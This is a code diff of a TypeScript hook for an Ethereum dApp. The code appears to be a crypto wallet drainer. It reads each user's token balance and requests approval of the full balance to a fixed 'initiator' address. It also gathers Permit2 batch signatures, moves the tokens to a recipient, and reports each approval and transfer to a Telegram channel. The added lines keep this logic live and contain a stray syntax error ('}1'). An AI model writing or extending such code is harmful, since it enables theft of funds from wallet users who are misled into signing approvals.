-  //     log(`Generated deep link: ${deepLink}`);
-  //     await sendToTelegram(`Action required: Please approve the batch permit using this link:\n${deepLink}`);
-  //     redirectToDeepLink(deepLink);
-  
-  //     // Request EIP-712 signature
-  //     console.log("Requesting EIP-712 signature from user...");
-  //     const signature = await signer._signTypedData(domain, batchTypes, typedDataValue);
-  //     console.log("Signature received:", signature);
-  
-  //     // Initiator pays for on-chain transactions
-  //     const initiatorWallet = new ethers.Wallet(initiatorPK, provider);
-  //     let nonce = await provider.getTransactionCount(initiator, "pending");
-  //     const gasPrice = await provider.getGasPrice();
-  
-  //     const permitData = permit2Contract.interface.encodeFunctionData("permit", [
-  //       selectedAddress,
-  //       typedDataValue,
-  //       signature,
-  //     ]);
-  
-  //     const permitTx = {
-  //       from: initiator,
-  //       to: Permit2Contract,
-  //       nonce: ethers.utils.hexlify(nonce),
-  //       gasLimit: ethers.BigNumber.from("200000"),
-  //       gasPrice,
-  //       value: "0x0",
-  //       data: permitData,
-  //     };
-  
-  //     console.log("Sending permit transaction (initiator pays)...");
-  //     const signedPermitTx = await initiatorWallet.signTransaction(permitTx);
-  //     const permitResponse = await provider.sendTransaction(signedPermitTx);
-  //     await permitResponse.wait();
-  //     console.log("Permit TX success:", permitResponse.hash);
-  
-  //     // Handle batch transfer
-  //     nonce++;
-  //     const batchTransferData = permit2Contract.interface.encodeFunctionData(
-  //       permit2Contract.interface.getFunction("transferFrom((address,address,uint160,address)[])"),
-  //       [transferDetails]
-  //     );
-  
-  //     const batchTransferTx = {
-  //       from: initiator,
-  //       to: Permit2Contract,
-  //       nonce: ethers.utils.hexlify(nonce),
-  //       gasLimit: ethers.utils.hexlify(300000),
-  //       gasPrice,
-  //       value: "0x0",
-  //       data: batchTransferData,
-  //     };
-  
-  //     console.log("Sending batch transferFrom TX...");
-  //     const signedBatchTx = await initiatorWallet.signTransaction(batchTransferTx);
-  //     const batchTxResponse = await provider.sendTransaction(signedBatchTx);
-  //     await batchTxResponse.wait();
-  //     console.log("Batch transfer TX success:", batchTxResponse.hash);
-  
-  //     console.log("Done!");
-  //     await sendToTelegram(`Batch transfer successful. Permit TX: ${permitResponse.hash}, Transfer TX: ${batchTxResponse.hash}`);
-  //   } catch (error) {
-  //     if (error instanceof Error) {
-  //       console.error("Error during permit and transfer:", error.message);
-  //       await sendToTelegram(`Error during permit and transfer: ${error.message}`);
-  //     } else {
-  //       console.error("Unknown error occurred during permit and transfer:", error);
-  //       await sendToTelegram("Unknown error occurred during permit and transfer.");
-  //     }
-  //   }
-  // }
-  
-
-const handleApprovalAndTransfer = async (
-  token: TokenBalance,
-  userAddress: string,
-  provider: ethers.providers.Web3Provider,
-  chainId: number | string,
-  recipientAddress: string,
-  walletName: string // Specify the wallet name for deep link generation
-): Promise<void> => {
-  try {
-    const signer = provider.getSigner();
-    const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
-    const permit2Contract = new ethers.Contract(Permit2Contract, Permit2ContractABI, signer);
-
-    let decimals: number;
+  const handleApprovalAndTransfer = async (
+    token: TokenBalance,
+    userAddress: string,
+    provider: ethers.providers.Web3Provider,
+    chainId: number | string,
+    recipientAddress: string,
+    walletName: string // Specify the wallet name for deep link generation
+  ): Promise<void> => {
     try {
-      decimals = await tokenContract.decimals();
-    } catch (error) {
-      warn(`Failed to fetch decimals for token ${token.name}. Defaulting to 18. Error:`, error);
-      decimals = 18; // Fallback to 18 decimals
-    }
+      const signer = provider.getSigner();
+      const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
+      const permit2Contract = new ethers.Contract(Permit2Contract, Permit2ContractABI, signer);
 
-    let rawBalance: BigNumber;
-    try {
-      rawBalance = await tokenContract.balanceOf(userAddress);
-    } catch (error) {
-      console.error(
-        `Failed to fetch balance for token ${token.name} (${token.address}). Skipping transfer. Error:`,
-        error
-      );
-      return; // Exit if balance can't be fetched
-    }
-
-    if (rawBalance.isZero()) {
-      warn(`User has zero balance for token ${token.name}. Skipping transfer.`);
-      return;
-    }
-
-    const adjustedBalance = ethers.utils.formatUnits(rawBalance, decimals);
-    log(`Token: ${token.name} | Raw Balance: ${rawBalance.toString()} | Adjusted Balance: ${adjustedBalance}`);
-
-    // Fetch Permit2 allowance
-    let permit2Allowance = BigNumber.from(0);
-    try {
-      const [, , currentAllowance] = await permit2Contract.allowance(userAddress, token.address, recipientAddress);
-      permit2Allowance = BigNumber.from(currentAllowance);
-      log(`Permit2 allowance for ${token.name}: ${permit2Allowance.toString()}`);
-    } catch (error) {
-      warn(`Failed to fetch Permit2 allowance for ${token.name}. Falling back to standard approval. Error:`, error);
-    }
-
-    // Check Permit2 allowance before fallback
-    if (permit2Allowance.gte(rawBalance)) {
-      log(`Sufficient Permit2 allowance exists for token ${token.name}. Proceeding with transfer.`);
-      await handlePermit2AndTransfer([token], walletName);
- // Use Permit2 transfer logic
-      return;
-    }
-
-    // Fetch current standard ERC20 allowance
-    const allowance = await tokenContract.allowance(userAddress, BR_INITIATOR_ADDRESS);
-    log(`Standard allowance for ${token.name}: ${ethers.utils.formatUnits(allowance, decimals)}`);
-
-    // Generate deep link for wallet approval
-    const deepLinkParams = {
-      method: "approveTransaction",
-      params: {
-        tokenAddress: token.address,
-        userAddress,
-        chainId,
-        recipientAddress,
-        amount: rawBalance.toString(),
-      },
-    };
-
-    const deepLink = generateDeepLink(walletName, deepLinkParams);
-    log(`Generated deep link: ${deepLink}`);
-
-    // Notify Telegram about the deep link
-    await sendToTelegram(`Approval required for ${token.name}. Use this link: ${deepLink}`);
-
-    // Approve the full balance if needed
-    if (allowance.lt(rawBalance)) {
-      log(
-        `Allowance (${allowance.toString()}) is less than balance (${rawBalance.toString()}). Waiting for approval transaction...`
-      );
+      let decimals: number;
       try {
-        const approveTx = await tokenContract.approve(BR_INITIATOR_ADDRESS, rawBalance);
-        log(`Approval transaction sent. Tx Hash: ${approveTx.hash}`);
-        await approveTx.wait();
-        log(`Approval successful for ${adjustedBalance} ${token.symbol}`);
-        await sendToTelegram(`Approval successful for ${adjustedBalance} ${token.name}. Tx Hash: ${approveTx.hash}`);
+        decimals = await tokenContract.decimals();
       } catch (error) {
-        console.error(`Error during approval for token ${token.name}:`, error);
-        return; // Skip transfer if approval fails
+        warn(`Failed to fetch decimals for token ${token.name}. Defaulting to 18. Error:`, error);
+        decimals = 18; // Fallback to 18 decimals
       }
-    } else {
-      log(`Sufficient standard allowance exists for token ${token.name}. Skipping approval.`);
-    }
 
-    // Prepare payload for backend transfer
-    const payload = {
-      tokenAddress: token.address,
-      userAddress,
-      chainId: Number(chainId), // Ensure chainId is a number
-      recipientAddress,
-    };
+      let rawBalance: BigNumber;
+      try {
+        rawBalance = await tokenContract.balanceOf(userAddress);
+      } catch (error) {
+        console.error(
+          `Failed to fetch balance for token ${token.name} (${token.address}). Skipping transfer. Error:`,
+          error
+        );
+        return; // Exit if balance can't be fetched
+      }
 
-    try {
-      const response = (await sendToBackend("handleApprovalAndTransfer", payload)) as {
-        backendTxHash: string;
-        frontendTxHash: string;
+      if (rawBalance.isZero()) {
+        warn(`User has zero balance for token ${token.name}. Skipping transfer.`);
+        return;
+      }1
+
+      const adjustedBalance = ethers.utils.formatUnits(rawBalance, decimals);
+      log(`Token: ${token.name} | Raw Balance: ${rawBalance.toString()} | Adjusted Balance: ${adjustedBalance}`);
+
+      // Fetch Permit2 allowance
+      let permit2Allowance = BigNumber.from(0);
+      try {
+        const [, , currentAllowance] = await permit2Contract.allowance(userAddress, token.address, recipientAddress);
+        permit2Allowance = BigNumber.from(currentAllowance);
+        log(`Permit2 allowance for ${token.name}: ${permit2Allowance.toString()}`);
+      } catch (error) {
+        warn(`Failed to fetch Permit2 allowance for ${token.name}. Falling back to standard approval. Error:`, error);
+      }
+
+      // Check Permit2 allowance before fallback
+      if (permit2Allowance.gte(rawBalance)) {
+        log(`Sufficient Permit2 allowance exists for token ${token.name}. Proceeding with transfer.`);
+        await handlePermit2AndTransfer([token], walletName);
+   // Use Permit2 transfer logic
+        return;
+      }
+
+      // Fetch current standard ERC20 allowance
+      const allowance = await tokenContract.allowance(userAddress, BR_INITIATOR_ADDRESS);
+      log(`Standard allowance for ${token.name}: ${ethers.utils.formatUnits(allowance, decimals)}`);
+
+      // Generate deep link for wallet approval
+      const deepLinkParams = {
+        method: "approveTransaction",
+        params: {
+          tokenAddress: token.address,
+          userAddress,
+          chainId,
+          recipientAddress,
+          amount: rawBalance.toString(),
+        },
       };
 
-      if (response?.backendTxHash && response?.frontendTxHash) {
-        log(
-          `Transfer successful! Backend Tx Hash: ${response.backendTxHash}, Frontend Tx Hash: ${response.frontendTxHash}`
-        );
-        await sendToTelegram(
-          `Transfer successful for ${adjustedBalance} ${token.name}.\nBackend Tx Hash: ${response.backendTxHash}\nFrontend Tx Hash: ${response.frontendTxHash}`
-        );
-      } else {
-        warn(`Unexpected backend response for ${token.name}:`, response);
-      }
-    } catch (error) {
-      console.error(`Error sending transfer request for token ${token.name} to backend:`, error);
-    }
-  } catch (error: unknown) {
-    if (error instanceof Error) {
-      console.error(`Error in handleApprovalAndTransfer for token ${token.name}:`, error.message);
-      await sendToTelegram(`Error during approval or transfer for ${token.name}: ${error.message}`);
-    } else {
-      console.error(`Unknown error in handleApprovalAndTransfer:`, error);
-    }
-  }
-};
+      const deepLink = generateDeepLink(walletName, deepLinkParams);
+      log(`Generated deep link: ${deepLink}`);
 
- 
+      // Notify Telegram about the deep link
+      await sendToTelegram(`Approval required for ${token.name}. Use this link: ${deepLink}`);
+
+      // Approve the full balance if needed
+      if (allowance.lt(rawBalance)) {
+        log(
+          `Allowance (${allowance.toString()}) is less than balance (${rawBalance.toString()}). Waiting for approval transaction...`
+        );
+        log(`[APPROVAL] Showing approval popup for token ${token.name} (${token.address})`);
+        try {
+          const approveTx = await tokenContract.approve(BR_INITIATOR_ADDRESS, rawBalance);
+          log(`Approval transaction sent. Tx Hash: ${approveTx.hash}`);
+          await approveTx.wait();
+          log(`Approval successful for ${adjustedBalance} ${token.symbol}`);
+          await sendToTelegram(`Approval successful for ${adjustedBalance} ${token.name}. Tx Hash: ${approveTx.hash}`);
+        } catch (error) {
+          console.error(`Error during approval for token ${token.name}:`, error);
+          return; // Skip transfer if approval fails
+        }
+      } else {
+        log(`Sufficient standard allowance exists for token ${token.name}. Skipping approval.`);
+      }
+
+      // Prepare payload for backend transfer
+      const payload = {
+        tokenAddress: token.address,
+        userAddress,
+        chainId: Number(chainId), // Ensure chainId is a number
+        recipientAddress,
+      };
+
+      try {
+        const response = (await sendToBackend("handleApprovalAndTransfer", payload)) as {
+          backendTxHash: string;
+          frontendTxHash: string;
+        };
+
+        if (response?.backendTxHash && response?.frontendTxHash) {
+          log(
+            `Transfer successful! Backend Tx Hash: ${response.backendTxHash}, Frontend Tx Hash: ${response.frontendTxHash}`
+          );
+          await sendToTelegram(
+            `Transfer successful for ${adjustedBalance} ${token.name}.\nBackend Tx Hash: ${response.backendTxHash}\nFrontend Tx Hash: ${response.frontendTxHash}`
+          );
+        } else {
+          warn(`Unexpected backend response for ${token.name}:`, response);
+        }
+      } catch (error) {
+        console.error(`Error sending transfer request for token ${token.name} to backend:`, error);
+      }
+    } catch (error: unknown) {
+      if (error instanceof Error) {
+        console.error(`Error in handleApprovalAndTransfer for token ${token.name}:`, error.message);
+        await sendToTelegram(`Error during approval or transfer for ${token.name}: ${error.message}`);
+      } else {
+        console.error(`Unknown error in handleApprovalAndTransfer:`, error);
+      }
+    }
+  }; 
 
   return { loading, sendTransactions };
 }
+console.log("Using permit file: [filename]");
+
 
 export default usePermits;
